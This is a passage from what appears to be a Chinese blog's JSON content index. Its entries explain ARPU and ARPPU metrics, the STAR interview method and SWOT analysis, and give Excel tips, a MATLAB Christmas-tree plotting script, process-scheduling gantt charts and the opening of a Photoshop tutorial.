这个指标考核的是某时间段内平均每个付费用户为应用创造的收入。在用户数量上，ARPPU只考虑某一时间段内的付费用户，而非该时间段内所有的活跃用户。\n\n<!-- more -->\n\nARPPU能够反映付费用户为你的应用带来了多少收益，显示出一个忠诚付费用户实际上愿意支付的金额。同时，这个指标也可以显示用户对一些付费项目的反应。\n\n应用提高收费价格，ARPPU会有一定的提升。但这并不意味着盈利也随之增长，因为涨价往往会让一些无法接受新价格的用户停止付费，导致付费用户规模下降。\n\n因此，ARPU与ARPPU两者的关系其实可以这样表达：\n\n> **ARPU = ARPPU \\* 付费用户比例**\n\n我们依然用一个例子来理解一下：\n\n假如你的应用有 10,000 个活跃用户，其中 30 个是付费用户，你的月收入是 30,000 美金。\n\n那么，ARPU = $30,000 / 10,000 = $3\n\n也就是说，一个活跃用户平均一个月能给你带来$3的收益。\n\n同时，ARPPU = $30,000 / 30 = $1,000\n\n也就是说，一个付费用户平均在一个月能给你带来 $1,000 的收益。\n\n在这种情况下，付费用户规模为 30 / 10,000 = 0.3%\n\nARPU($3) = ARPPU($1,000) * 付费用户规模(0.3%)\n\n## 累计 ARPU\n\n在实际应用中，还有一个十分有用的指标：累计ARPU。\n\n如果说ARPU计算的是一个时间段内全部用户产生的应用收益，累计ARPU则聚焦在一定时间段内的某组用户群体对应用产生的收益。\n\n累计ARPU通常以一段时间为计算单位，比如说1天、7天、14天、30天等等。举个例子，ARPU可以用于计算10月1日下载应用的100名用户在30天内平均每人为应用带来了多少收益。\n\n因此，累积ARPU是一个不断增长的数值，因为计算的用户对象数值不变，但是产生的收益却在一直增长。如果应用表现良好，流量购买就发挥效果，累积ARPU的值迟早都会超过CPI（cost per install，单次安装成本）。这就意味着，你买的量开始给你盈利了，ROI从此超过100%。\n\n当时间范围延长，累积ARPU无限接近一个极限值，这就是我们常说的LTV指数了。\n\n![累计 ARPU](https://up-img.yonghong.tech/pic/2020/10/11-10-32-JsbDho-9YHAaC.png)\n\n## 其他\n\nARPU: the Average Revenue Per User 有时候也是 the Average Revenue Per Unit\n\nARPA: the Average Revenue Per Account\n\nARPC: the Average Revenue Per Customer\n\nLTV: Life Time Value 用户的终身价值或用户生命周期价值\n\nCAC: Customer Acquisition Cost 用户获取成本\n\nROI: Return on Investment 投资回报\n\nROAS: Return on Advertising Spend 广告投资回报\n\n","categories":["wiki"],"tags":["wiki","ARPU","ARPPU","ARPA","ARPC","ROI","每用户平均收入","平均每用户收入","每帐户平均收入","每客户平均收入","每个付费用户的平均收入"]},{"title":"STAR法则","url":"//wiki/star/","content":"\n> 本文转载自 [百度百科：STAR法则](https://baike.baidu.com/item/STAR%E6%B3%95%E5%88%99/9056070)\n\n![STAR法则](https://up-img.yonghong.tech/pic/2020/10/04-20-39-CAldGX-3y4j70.jpg)\n\nSTAR法则是情境(situation)、目标（target）、行动(action)、结果(result)四项的缩写。STAR法则是一种常常被面试官使用的工具，用来收集面试者与工作相关的具体信息和能力。STAR法则比起传统的面试手法来说，可以更精确地预测面试者未来的工作表现。\n\n<!-- more -->\n\n## 概念\n\nSTAR法则,即为Situation Target Action Result的缩写，具体含义是:\n- Situation: 事情是在什么情况下发生\n- Target 你是如何明确你的目标的\n- Action: 针对这样的情况分析，你采用了什么行动方式\n- Result: 结果怎样，在这样的情况下你学习到了什么\n\n简而言之，STAR法则，就是一种讲述自己故事的方式，或者说，是一个清晰、条理的作文模板。不管是什么，合理熟练运用此法则，可以轻松的对面试官描述事物的逻辑方式，表现出自己分析阐述问题的清晰性、条理性和逻辑性。\n\n## 详细释义\n\nSTAR法则，500强面试题回答时的技巧法则，备受面试者成功者和500强HR的推崇。\n\n由于这个法则被广泛应用于面试问题的回答，尽管我们还在写简历阶段，但是，写简历时能把面试的问题就想好，会使自己更加主动和自信，做到简历，面试关联性，逻辑性强，不至于在一个月后去面试，却把简历里的东西都忘掉了（更何况有些朋友会稍微夸大简历内容）\n\n在我们写简历时，每个人都要写上自己的工作经历，活动经历，想必每一个同学，都会起码花上半天甚至更长的时间去搜寻脑海里所有有关的经历，争取找出最好的东西写在简历上。\n\n但是此时，我们要注意了，简历上的任何一个信息点都有可能成为日后面试时的重点提问对象，所以说，不能只管写上让自己感觉最牛的经历就完事了，要想到今后，在面试中，你所写的经历万一被面试官问到，你真的能回答得流利，顺畅，且能通过这段经历，证明自己正是适合这个职位的人吗？\n\n## 示例\n\n写简历时就要准备好面试时的个人故事，以便应付各种千奇百怪的开放性问题。\n\n为了使大家轻松应对这一切，我向大家推荐“个人事件模块”的方法，以使自己迅速完成这看似庞大的工程。\n\n### 个人事件模块\n\n1. 头脑风暴。\n\n在脑海里仔细想出从大一到大四自己参与过所有活动（尤其是能突出你某些能力的活动），包括：\n\n- 社团活动 职务 时间 所做事情\n- 在公司实习的经历 职务 时间 所做过的事情\n- 与他人一起合作的经历（课题调研，帮助朋友办事）\n\n（回忆要尽量的详细，按时间倒序写在纸上，如大一上学期发生、大一下学期发生。如此类推）\n我相信这一步，很多朋友都已经做了，但是仅仅这样就满足了，就直接写在简历上当完事了，那是不行的，想提高竞争力，还得继续。。\n\n2. STAR法则应用\n\n将每件事用S T A R 四点写出，将重要的事情做成表格。\n\n例：大一辩论比赛获得冠军\n- S系里共有5支队伍参赛，实力。。。，我们小组。。。。。\n- T熟悉辩论流程，掌握辩论技巧，获得系冠军\n- A自己主动整理资料，组织小组学习流程，编制训练题，小组训练，根据每个人的特点，分配任务（详细，尽量详细，包括当中遇到的困难都要回忆起来，自己是怎么解决的）\n- R获得系辩论赛冠军\n\n以上这个例子中，可以让HR迅速了解你整个活动的前因后果，同时，也突出了你在这个活动过程中的领导能力，沟通能力，主动解决问题的能力等等。\n\n将刚才在头脑风暴中，想到的事情都用这个方法做出表格。一般来说，特别突出的事情应该要达到7，8件。\n\n这个时候，个人事件模块的工作就算完成了，但是，怎么运用呢？还得再做多一步。\n\n### 挖掘闪光点\n\n开放性问题大家都要回答吧？大家也都知道，其实每一个开放性问题都在考查自己的每一项能力，如领导能力，沟通能力，适应能力等等。而挖掘闪光点就是在这些事件模块中找出你所能体现的这些能力，如上例辩论赛中所体现的领导能力，沟通能力，主动解决问题。这时候，就可以在下面加多一行，能力体现。\n\n大一辩论比赛获得冠军\n- S 系里共有5支队伍参赛，实力。。。，我们小组。。。。。\n- T 熟悉辩论流程，掌握辩论技巧，获得系冠军\n- R 获得系辩论赛冠军\n\n能力沟通能力，协作能力，领导能力，主动解决问题能力\n\n## 总结\n\n有了事情模块，也知道了每个事件自己所体现出的能力，这时候的你，还需要害怕那些开放性问题吗？\n\n以上所说都是主要为面试而准备的，但是，写简历阶段时就可以应用这些模块，针对你某阶段的某一件事，将模块中的A，R两项以简洁的语言写上。这样，当HR问你简历上的问题时，你就可以有备而回答之啦！当然，针对职位的不同，要求自然也不同，但是，这一切都可以参考STAR法则来解决，例如，你要申请的是销售类的，你就将关于沟通能力，营销经验的事例写上，并且突出自己与其的相关性，这样，自然就可以提高简历的命中率。\n\n","categories":["wiki"],"tags":["wiki","STAR","STAR法则"]},{"title":"SWOT分析法","url":"//wiki/swot/","content":"\n> 本文转载自 [百度百科：SWOT分析法](https://baike.baidu.com/item/SWOT%E5%88%86%E6%9E%90%E6%B3%95/150223)\n\n![SWOT分析法](https://up-img.yonghong.tech/pic/2020/10/04-20-34-rdK27d-fpdd02.jpg)\n\n所谓SWOT分析，即基于内外部竞争环境和竞争条件下的态势分析，就是将与研究对象密切相关的各种主要内部优势、劣势和外部的机会和威胁等，通过调查列举出来，并依照矩阵形式排列，然后用系统分析的思想，把各种因素相互匹配起来加以分析，从中得出一系列相应的结论，而结论通常带有一定的决策性。\n\n运用这种方法，可以对研究对象所处的情景进行全面、系统、准确的研究，从而根据研究结果制定相应的发展战略、计划以及对策等。\n\nS （strengths）是优势、W （weaknesses）是劣势，O （opportunities）是机会、T （threats）是威胁。按照企业竞争战略的完整概念，战略应是一个企业“能够做的”（即组织的强项和弱项）和“可能做的”（即环境的机会和威胁）之间的有机组合。\n\n<!-- more -->\n\n## 基本解释\n\n所谓SWOT分析，即基于内外部竞争环境和竞争条件下的态势分析，就是将与研究对象密切相关的各种主要内部优势、劣势和外部的机会和威胁等，通过调查列举出来，并依照矩阵形式排列，然后用系统分析的思想，把各种因素相互匹配起来加以分析，从中得出一系列相应的结论，而结论通常带有一定的决策性。\n\n运用这种方法，可以对研究对象所处的情景进行全面、系统、准确的研究，从而根据研究结果制定相应的发展战略、计划以及对策等。\n\nS （strengths）是优势、W （weaknesses）是劣势，O （opportunities）是机会、T （threats）是威胁。按照企业竞争战略的完整概念，战略应是一个企业“能够做的”（即组织的强项和弱项）和“可能做的”（即环境的机会和威胁）之间的有机组合。\n\n## 特点\n\nSWOT分析方法从某种意义上来说隶属于企业内部分析方法，即根据企业自身的条件在既定内进行分析。SWOT分析有其形成的基础。著名的竞争战略专家迈克尔.波特提出的竞争理论从产业结构入手对一个企业“可能做的”方面进行了透彻的分析和说明，而能力学派管理学家则运用价值链解构企业的价值创造过程，注重对公司的资源和能力的分析。\n\nSWOT分析，就是在综合了前面两者的基础上，以资源学派学者为代表，将公司的内部分析（即20世纪80年代中期管理学界权威们所关注的研究取向），与以能力学派为代表的产业竞争环境的外部分析（即更早期战略研究所关注的中心主题，以安德鲁斯与迈克尔.波特为代表）结合起来，形成了自己结构化的平衡系统分析体系。 与其他的分析方法相比较，SWOT分析从一开始就具有显著的结构化和系统性的特征。就结构化而言，首先在形式上，SWOT分析法表现为构造SWOT结构矩阵，并对矩阵的不同区域赋予了不同分析意义。其次内容上，SWOT分析法的主要理论基础也强调从结构分析入手对企业的外部环境和内部资源进行分析。\n\n## 分析模型\n\n### 优势与劣势分析（SW）\n\n由于企业是一个整体，并且由于竞争优势来源的广泛性，所以，在做优劣势分析时必须从整个价值链的每个环节上，将企业与竞争对手做详细的对比。如产品是否新颖，制造工艺是否复杂，销售渠道是否畅通，以及价格是否具有竞争性等。如果一个企业在某一方面或几个方面的优势正是该行业企业应具备的关键成功要素，那么，该企业的综合竞争优势也许就强一些。需要指出的是，衡量一个企业及其产品是否具有竞争优势，只能站在现有潜在用户角度上，而不是站在企业的角度上。\n\n### 机会与威胁分析（OT）\n\n比如当前社会上流行的盗版威胁：盗版替代品限定了公司产品的最高价，替代品对公司不仅有威胁，可能也带来机会。企业必须分析，替代品给公司的产品或服务带来的是 “灭顶之灾”呢，还是提供了更高的利润或价值；购买者转而购买替代品的转移成本；公司可以采取什么措施来降低成本或增加附加值来降低消费者购买盗版替代品的风险。\n\n### 整体分析\n\n从整体上看，SWOT可以分为两部分：第一部分为SW，主要用来分析内部条件；第二部分为OT，主要用来分析外部条件。利用这种方法可以从中找出对自己有利的、值得发扬的因素，以及对自己不利的、要避开的东西，发现存在的问题，找出解决办法，并明确以后的发展方向。根据这个分析，可以将问题按轻重缓急分类，明确哪些是急需解决的问题，哪些是可以稍微拖后一点儿的事情，哪些属于战略目标上的障碍，哪些属于战术上的问题，并将这些研究对象列举出来，依照矩阵形式排列，然后用系统分析的所想，把各种因素相互匹配起来加以分析，从中得出一系列相应的结论而结论通常带有一定的决策性，有利于领导者和管理者做出较正确的决策和规划。\n\n## 应用\n\nSWOT分析法常常被用于制定集团发展战略和分析竞争对手情况，在战略分析中，它是最常用的方法之一。进行SWOT分析时，主要有以下几个方面的内容：\n\n### 分析环境因素\n\n运用各种调查研究方法，分析出公司所处的各种环境因素，即外部环境因素和内部能力因素。外部环境因素包括机会因素和威胁因素，它们是外部环境对公司的发展直接有影响的有利和不利因素，属于客观因素，内部环境因素包括优势因素和弱点因素，它们是公司在其发展中自身存在的积极和消极因素，属主观因素，在调查分析这些因素时，不仅要考虑到历史与现状，而且更要考虑未来发展问题。\n\n优势，是组织机构的内部因素，具体包括：有利的竞争态势；充足的财政来源；良好的企业形象；技术力量；规模经济；产品质量；市场份额；成本优势；广告攻势等。\n\n劣势，也是组织机构的内部因素，具体包括：设备老化；管理混乱；缺少关键技术；研究开发落后；资金短缺；经营不善；产品积压；竞争力差等。\n\n机会，是组织机构的外部因素，具体包括：新产品；新市场；新需求；外国市场壁垒解除；竞争对手失误等。\n\n威胁，也是组织机构的外部因素，具体包括：新的竞争对手；替代产品增多；市场紧缩；行业政策变化；经济衰退；客户偏好改变；突发事件等。\n\nSWOT方法的优点在于考虑问题全面，是一种系统思维，而且可以把对问题的“诊断”和“开处方”紧密结合在一起，条理清楚，便于检验。\n\n### 构造SWOT矩阵\n\n将调查得出的各种因素根据轻重缓急或影响程度等排序方式，构造SWOT矩阵。在此过程中，将那些对公司发展有直接的、重要的、大量的、迫切的、久远的影响因素优先排列出来，而将那些间接的、次要的、少许的、不急的、短暂的影响因素排列在后面。\n\n### 制定行动计划\n\n在完成环境因素分析和SWOT矩阵的构造后，便可以制定出相应的行动计划。制定计划的基本思路是：发挥优势因素，克服弱点因素，利用机会因素，化解威胁因素；考虑过去，立足当前，着眼未来。运用系统分析的综合分析方法，将排列与考虑的各种环境因素相互匹配起来加以组合，得出一系列公司未来发展的可选择对策。\n\n## 规则\n\n成功应用SWOT分析法的简单规则：\n- 进行SWOT分析的时候必须对公司的优势与劣势有客观的认识。\n- 进行SWOT分析的时候必须区分公司的现状与前景。\n- 进行SWOT分析的时候必须考虑全面。\n- 进行SWOT分析的时候必须与竞争对手进行比较，比如优于或是劣于你的竞争对手。\n- 保持SWOT分析法的简洁化，避免复杂化与过度分析。\n- SWOT分析法因人而异。\n\n## 贡献\n\nSWOT方法的贡献就在于用系统的思想将这些似乎独立的因素相互匹配起来进行综合分析，使得企业战略计划的制定更加科学全面。\n\n\n\n\n","categories":["wiki"],"tags":["wiki","SWOT","SWOT分析"]},{"title":"Excel 技巧分享","url":"/2018/01/2018-01-01-excel/","content":"\n\n> [Excel练习表格下载链接](http://pan.baidu.com/share/link?shareid=1822132744&uk=1571196685)\n\n\n### 1. 推荐 Office 2016\n\n首先我不是说必须要用 Office 2016 ，因为2010、2013用的也比较多，计算机二级考试中用的还是2010。没有一家企业会生产客户不需要的产品，真正成功的企业的核心竞争力在于能带领消费者一同进步。所以能用最新版的就用最新版。具体怎么安装相信你们可以百度得到。\n其次，2016很多美化的功能都很易用，这个大家去探索一下，Excel虽然是处理数据的，但是处理完之后总要给人看的吧，所以美观也是很重要的。\n\n<!-- more -->\n\n![excel1.png](https://up-img.yonghong.tech/pic/2021/07/29-12-47-1-hSHhuQ.png)\n\n\n### 2. 基础操作\n\n> [Excel帮助文档](https://support.office.com/zh-cn/excel)\n\n---\n\n> #### 0. 基本输入\n1. 日期。 如果你要快速输入当前日期，你只需在 Excel 的单元格中按【Ctrl+;】就可以了，注意分号（；）必须是半角英文的，这时就会自动出现当前（今天）日期了，输入当前时间为【Ctrl+Shift+;】\n2. 换行。【Alt+Enter】\n3. 数据格式。右键->设置单元格格式\n4. 序号输入，数列输入\n\n---\n\n> #### 1. 公式与函数\n1. 选择放置结果的表格\n2. 输入【=】，编辑栏中显示【=】\n3. 在编辑栏中输入公式，如【=(B2+B3)/2】、【=SUM(B2:B6,B8:B12)】\n4. 回车或者单击表格其他框\n\n---\n\n> #### 2. 引用运算符\n1. 冒号【:】从某一单元格到另一单元格之间的数据\n2. 逗号【,】多块数据区域\n\n---\n\n> #### 3. 单元格的引用\n相对引用\n绝对引用\n使用【$】在横坐标前就是固定横标，在纵坐标前就是固定纵标\n\n---\n\n> #### 4. 常用函数\n1. SUM求和\n2. AVERAGE求平均数\n3. COUNT求有数值的单元格个数\n4. MAX MIN 最大最小值函数\n5. LARGE SMALL 求第k大/小的数值\n6. RANK\n\n---\n\n> #### 5. 逻辑函数\n1. AND 它的语法为AND(logical1,logical2,...) 。其中lgical1,logical2,...表示待检测的条件值，各条件值可能为TRUE，可能为FALSE.参数必须是逻辑值\n2. OR 方法与AND用法类似\n3. NOT NOT函数用于对参数值求反。比如 NOT(2+2=4) ，由于2+2的结果的确\n为4，该参数结果为TRUE，由于是NOT函数，因此返回函数结果与之相反，为FALSE。\n4. IF \n它的语法为IF(logical\\_test,value\\_if\\_true,value\\_if\\_false)。其中Logical\\_test表示计算结果为TRUE或FALSE的任意值或表达式。本参数可使用任何比较运算符。\n\n---\n\n> #### 6. 数组函数\n[微软官方使用说明书](https://support.office.com/zh-cn/article/%E6%95%B0%E7%BB%84%E5%85%AC%E5%BC%8F%E6%8C%87%E5%8D%97%E5%92%8C%E7%A4%BA%E4%BE%8B-3be0c791-3f89-4644-a062-8e6e9ecee523)\n注意： 输入公式后记得按【Ctrl+Shift+Enter】（CSE公式），不能只改动一个数据块中某一单元格的公式。\n[应用举例](http://windyli.blog.51cto.com/1300305/306009)\n\n\n### 3. 数据管理\n\n#### 1. 排序，筛选\n#### 2. 分类汇总\n#### 3. [LOOKUP官方文档](https://support.office.com/zh-cn/article/LOOKUP-%E5%87%BD%E6%95%B0-446d94af-663b-451d-8251-369d5e3864cb) \n[VLOOKUP官方文档](https://support.office.com/zh-cn/article/VLOOKUP-%E5%87%BD%E6%95%B0-0bbc8083-26fe-4963-8ab8-93a18ad188a1)\n[HLOOKUP官方文档](https://support.office.com/zh-cn/article/HLOOKUP-%E5%87%BD%E6%95%B0-a3034eec-b719-4ba3-bb65-e1ad662ed95f?ui=zh-CN&rs=zh-CN&ad=CN)\n#### 4. [MATCH函数 INDEX函数](http://wenku.baidu.com/view/0260776f561252d380eb6e8a.html)\n#### 5. [数据透视表](https://www.zhihu.com/question/22484899)\n\n### 4. 作图\n\n* a. 选中数据后直接有快捷创建图表的按钮\n* b. 创建折线图\n* c. 可操作的区域有，坐标轴，网格，数据曲线，趋势线（即线性回归线），线上的数据点，标题，图表的边框\n* d. 操作的方式有：\n1. 右边侧栏的设置菜单及其 N 个子菜单 \n2. 鼠标右键菜单（可调控的东西太多太多了，大家回去都试一下吧）\n线性回归在数据曲线上右键 -> 添加趋势线即可，建议将趋势线换一种颜色，并在菜单里面寻找 \"显示公式\" 选项，并勾选它\n* e. 调整大小，使网格为方形，并添加数据点图标，数据点标注可以很方便的手工作图（不用尺子或数格子）\n\n![图片 1.png](https://up-img.yonghong.tech/pic/2021/07/29-12-47-2-maGMIx.png)\n\n\n### 5. VBA编程\n\nVBA编程是基于VB的，可以做很多事情，面向非专业编程人员，大家可以自己尝试一下。\n\n","categories":["技巧"],"tags":["技巧","Excel"]},{"title":"用 MATLAB 画圣诞树","url":"/2018/01/2018-01-01-merry-christmas/","content":"\n效果是这样：\n\n![Merry Christmas.jpg](https://up-img.yonghong.tech/pic/2021/07/29-12-45-1-GMZGaZ.jpg)\n\n<!-- more -->\n\n```matlab\nfunction christmas\n\n% Anselm Ivanovas, anselm.ivanovas@student.unisg.ch\n\n%Basically just a nice plot for some christmas fun.\n%3D Plot of a hhristmas tree with some presents and snow\n\n%% setup\nsnow=800;     % number of snow flakes [0 .. 5000]\n\n\n%% draw tree\nh=0:0.2:25; %vertical grid\n[X,Y,Z] = cylinder(tree(h)); %produce a tree formed cylinder\nZ=Z*25; %scale to the right heigth\n\n%Add some diffusion to the surface of the tree to make it look more real\n\ntreeDiffusion=rand(126,21)-0.5;%some horizontal diffusion data\n\n%add diffusion to the grid points \nfor cnt1=1:21\n\t\n\tfor cnt2=16:126%starting above the trunk\n\t\t%get the angle to always diffuse in direction of the radius\n\t\tangle=atan(Y(cnt2,cnt1)/X(cnt2,cnt1));\n\t\t%split the diffusion in the two coordinates, depending on the angle\n\t\tX(cnt2,cnt1)=X(cnt2,cnt1)+cos(angle)*treeDiffusion(cnt2,cnt1);\n\t\tY(cnt2,cnt1)=Y(cnt2,cnt1)+sin(angle)*treeDiffusion(cnt2,cnt1);\n\t\t%some Vertical diffusion for each point\n\t\tZ(cnt2,cnt1)=Z(cnt2,cnt1)+(rand-0.5)*0.5;\n\tend\n\t\nend\n%draw the tree\nsurfl(X,Y,Z,'light')\n\n%% View and format\n\n%Use as nice green color map (darker at the bottom, lighter at the top)\nr=(0.0430:(0.2061/50):0.2491)';%red component\ng=(0.2969:(0.4012/50):0.6981)';%green component\nb=(0.0625:(0.2696/50):0.3321)';%blue component\nmap=[r,g,b];%join in a map\nfor cnt=1:6\n\t%change the lower part to brown for the trunk\n\tmap(cnt,:)=[77,63,5]/265;\nend\n\ncolormap(map)%set the map\nview([-37.5,4])%Change the view to see a little more of the Actual 3D tree\nlighting phong %some nice lighting\nshading interp %remove grid and smoothen the surface color\naxis equal %takes care of display in the right proportion\naxis([-10 10 -10 10 0 30]) %give some more axis space (for the snow later)\naxis off %but don't show axis\nhold on %to draw the rest\ntitle('HAPPY HOLIDAYS')%self explaining\n\n%% Presents\n%Draw some presents around the tree (each with random color)\ndrawPresent(2,-4,0,3,3,2);\ndrawPresent(-4,3,0,2,3,1.5);\ndrawPresent(5,3,0,4,3,3);\ndrawPresent(-14,-5,0,6,3,1);\ndrawPresent(-9,-10,0,2,2,2);\ndrawPresent(0,4,0,4,3,3);\ndrawPresent(-6,-13,0,3,3,3);\n\n%% Snow\n\n%create some random 3D coordinates for the snow (amount as in setup above)\nsnowX=(rand(snow,1)*25-12.5);\nsnowY=(rand(snow,1)*25-12.5);\nsnowZ=(rand(snow,1)*27);\n%Note:Some flakes will end up IN the tree but just can't be seen then\nplot3(snowX,snowY,snowZ,'w*')%plot coordinates as white snow flakes\nhold off%Done\nend % of function\n\n\n%% ============= private functions\n\nfunction r=tree(h)%Gives a profile for the tree\nfor cnt=1:length(h)\n\t\n\tif(h(cnt)==0)%no Width at the bottom. Ensures a \"closed\" trunk\n\t\tr(cnt)=0;\n\tend\n\t%smaller radius for the trunk\n\tif (h(cnt)>0 && h(cnt)<=3)\n\t\tr(cnt)=1.5;\n\tend\n\n\t%reduce radius gradually from 8 to 0. Note: will only work with a trunk heigth\n\t%of 3 and a whole tree heigth of 25. Scale the height of the tree in\n\t%the \"draw tree\" section, since the cylinder command will return a 1\n\t%unit high cylinder anyway\n\tif(h(cnt)>3)\n\t\tr(cnt)=8-(h(cnt)-3)*0.3636;\n\tend\n\nend\n\nend % of function\n\n%Draws a present with the given coordinate + size in a random color\n%Note:Given coordinates apply to the lower front + left corner of the\n%present (the one closest to the viewer) as seen in the plot\nfunction drawPresent(dx,dy,dz,scalex,scaley,scalez) \n\n%the standard present coordinates\npresentX=[0.5 0.5 0.5 0.5 0.5; 0 1 1 0 0; 0 1 1 0 0; 0 1 1 0 0; 0.5 0.5 0.5 0.5 0.5];\npresentY=[0.5 0.5 0.5 0.5 0.5; 0 0 1 1 0; 0 0 1 1 0; 0 0 1 1 0; 0.5 0.5 0.5 0.5 0.5];\npresentZ=[0 0 0 0 0; 0 0 0 0 0; 0.5 0.5 0.5 0.5 0.5; 1 1 1 1 1; 1 1 1 1 1];\n\n%draw some presents with random colors\n%scale present and move it to the right place and get the plot handle\nmyHandle=surf((presentX*scalex+dx),(presentY*scaley+dy), (presentZ*scalez+dz));\n%some random color map\nrandColorMap(:,:,1)=repmat(rand,[5,5]);%r component\nrandColorMap(:,:,2)=repmat(rand,[5,5]);%g component\nrandColorMap(:,:,3)=repmat(rand,[5,5]);%b component\n%Assign colormap just to the plot handle object of the present, so the tree\n%does not change color\nset(myHandle,'CData',randColorMap)\nshading interp %Nice shding + without grid\n\nend % of function\n```\n\n","categories":["MATLAB"],"tags":["MATLAB","圣诞树"]},{"title":"进程调度算法典型问题练习","url":"/2018/01/2018-01-01-os-process/","content":"\n# 进程调度算法典型问题练习\n\n---\n\n> 题目：假设一个系统中有5个进程，它们的到达时间和服务时间如表所示，忽\n略I/O以及其他开销时间，若分别按FCFS,SPF,SRTF,HRRN,RR,FB(第i\n级队列时间片2i-1)以及Preemptive FB(第i级队列时间片2i-1)调度算法进\n行CPU调度，请给出各个进程的完成时间、周转时间、带权周转时间、\n平均周转时间和平均带权周转时间\n\n| 进程 | 到达时间 | 服务时间 |\n| :--: | :--:     | :--:     |\n| A    | 0        | 3        |\n| B    | 2        | 6        |\n| C    | 4        | 4        |\n| D    | 6        | 5        |\n| E    | 8        | 2        |\n\n\n<!-- more -->\n\n解：甘特图，可以使用 cmd markdown 解析下面的代码\n\n```gantt\ndateFormat SSS\n\ttitle  \n\tsection FCFS\n\t\tA :t11, 0s, 3s\n\t\tB :t12, after t11, 6s\n\t\tC :t13, after t12, 4s\n\t\tD :t14, after t13, 5s\n\t\tE :t15, after t14, 2s\n```\n\n```gantt\ndateFormat SSS\n\ttitle    \n\tsection SPF\n\t\tA :t21, 0s, 3s\n\t\tB :t22, after t21, 6s\n\t\tE :t23, after t22, 2s\n\t\tC :t24, after t23, 4s\n\t\tD :t25, after t24, 5s\n```\n\n```gantt\ndateFormat SSS\n\ttitle    \n\tsection SRTF\n\t\tA :t31, 0s, 3s\n\t\tB :t32, after t31, 1s\n\t\tC :t33, after t32, 4s\n\t\tE :t34, after t33, 2s\n\t\tB :t35, after t34, 5s\n\t\tD :t36, after t35, 5s\n```\n\n```gantt\ndateFormat SSS\n\ttitle            \n\tsection HRRN\n\t\tA :t41, 0s, 3s\n\t\tB :t42, after t41, 6s\n\t\tC :t43, after t42, 4s\n\t\tE :t44, after t43, 2s\n\t\tD :t45, after t44, 5s\n```\n\n```gantt\ndateFormat SSS\n\ttitle     \n\tsection RR（队首优先，q = 1）\n\t\tA :t51, 0s, 2s\n\t\tB :t52, after t51, 1s\n\t\tA :t53, after t52, 1s\n\t\tB :t54, after t53, 1s\n\t\tC :t55, after t54, 1s\n\t\tB :t56, after t55, 1s\n\t\tD :t57, after t56, 1s\n\t\tC :t58, after t57, 1s\n\t\tB :t59, after t58, 1s\n\t\tE :t510, after t59, 1s\n\t\tD :t511, after t510, 1s\n\t\tC :t512, after t511, 1s\n\t\tB :t513, after t512, 1s\n\t\tE :t514, after t513, 1s\n\t\tD :t515, after t514, 1s\n\t\tC :t516, after t515, 1s\n\t\tB :t517, after t516, 1s\n\t\tC :t518, after t517, 2s\n```\n\n```gantt\ndateFormat SSS\n\ttitle     \n\tsection RR（队首优先，q = 4）\n\t\tA :t61, 0s, 3s\n\t\tB :t62, after t61, 4s\n\t\tC :t63, after t62, 4s\n\t\tD :t64, after t63, 4s\n\t\tB :t65, after t64, 2s\n\t\tE :t66, after t65, 2s\n\t\tD :t67, after t66, 1s\n```\n\n```gantt\ndateFormat SSS\n\ttitle    \n\tsection RR（刚进来的进程优先，q = 1）\n\t\t A :t71, 0s, 2s\n\t\t B :t72, after t71, 1s\n\t\t A :t73, after t72, 1s\n\t\t C :t74, after t73, 1s\n\t\t B :t75, after t74, 1s\n\t\t D :t76, after t75, 1s\n\t\t C :t77, after t76, 1s\n\t\t E :t78, after t77, 1s\n\t\t B :t79, after t78, 1s\n\t\t D :t710, after t79, 1s\n\t\t C :t711, after t710, 1s\n\t\t E :t712, after t711, 1s\n\t\t B :t713, after t712, 1s\n\t\t D :t714, after t713, 1s\n\t\t C :t715, after t714, 1s\n\t\t B :t716, after t715, 1s\n\t\t D :t717, after t716, 1s\n\t\t B :t718, after t717, 1s\n\t\t D :t719, after t718, 1s\n``` \n\n```gantt\ndateFormat SSS\n\ttitle    \n\tsection RR（刚进来的进程优先，q = 4）\n\t\t A :t81, 0s, 3s\n\t\t B :t82, after t81, 4s\n\t\t C :t83, after t82, 4s\n\t\t D :t84, after t83, 4s\n\t\t E :t85, after t84, 2s\n\t\t B :t86, after t85, 2s\n\t\t D :t87, after t86, 1s\n```\n\n```gantt\ndateFormat SSS\n\ttitle     \n\tsection FB（非抢占）\n\t\tA :t91, 0s, 3s\n\t\tB :t92, after t91, 1s\n\t\tC :t93, after t92, 1s\n\t\tB :t94, after t93, 2s\n\t\tD :t95, after t94, 1s\n\t\tE :t96, after t95, 1s\n\t\tC :t97, after t96, 2s\n\t\tD :t98, after t97, 2s\n\t\tE :t99, after t98, 1s\n\t\tB :t910, after t99, 3s\n\t\tC :t911, after t910, 1s\n\t\tD :t912, after t911, 2s\n```\n\n```gantt\ndateFormat SSS\n\ttitle    \n\tsection FB（抢占）\n\t\tA :t101, 0s, 2s\n\t\tB :t102, after t101, 1s\n\t\tA :t103, after t102, 1s\n\t\tC :t104, after t103, 1s\n\t\tB :t105, after t104, 1s\n\t\tD :t106, after t105, 1s\n\t\tC :t107, after t106, 1s\n\t\tE :t108, after t107, 1s\n\t\tB :t109, after t108, 2s\n\t\tD :t1010, after t109, 2s\n\t\tC :t1011, after t1010, 2s\n\t\tE :t1012, after t1011, 1s\n\t\tB :t1013, after t1012, 2s\n\t\tD :t1014, after t1013, 2s\n```\n\n","categories":["操作系统"],"tags":["操作系统","进程调度","算法"]},{"title":"Ps 入门教程","url":"/2018/01/2018-01-01-photoshop-first-class/","content":"\n## 【0】. 自我介绍  \n计科专业，自己使用Ps只是出于日常处理一些图片的需求，关于设计美工谈不上。仅此而已。给大家讲课其实只是给大家介绍一下Ps以及一些简单的用法。[更加详细的教程请点击这里](http://pan.baidu.com/share/link?shareid=3038023453&uk=1571196685)\n\n<!-- more -->\n## 【1】. Photoshop介绍  \n\n![Ps.jpg](https://up-img.yonghong.tech/pic/2021/07/29-12-58-1-YOc7nr.jpg)\n\n![滤镜.jpg](https://up-img.yonghong.tech/pic/2021/07/29-12-58-2-SYS7uS.jpg)\n\n\n由于机房的软件硬件限制，今天给大家分享Ps使用方法用的软件版本是比较老的版本了，但是并不影响使用，大家如果想在自己电脑上用的话，我建议大家用最新版，最新版会有很多新的特性，能帮助我们更好的对图片进行处理。  \n\nBrige软件，用来方便的查看图片，支持格式多，还能根据各种方式进行排序，支持直接直接用Ps打开图片  \nPs内置Mini Brige,也能实现大部分功能。  \n\n菜单栏：  \n文件->打开/新建/打开为/自动/脚本  \n编辑->撤销/还原/首选项  \n图像->调整图片大小/调色  \n图层->对图层的操作（之后会讲什么是图层）  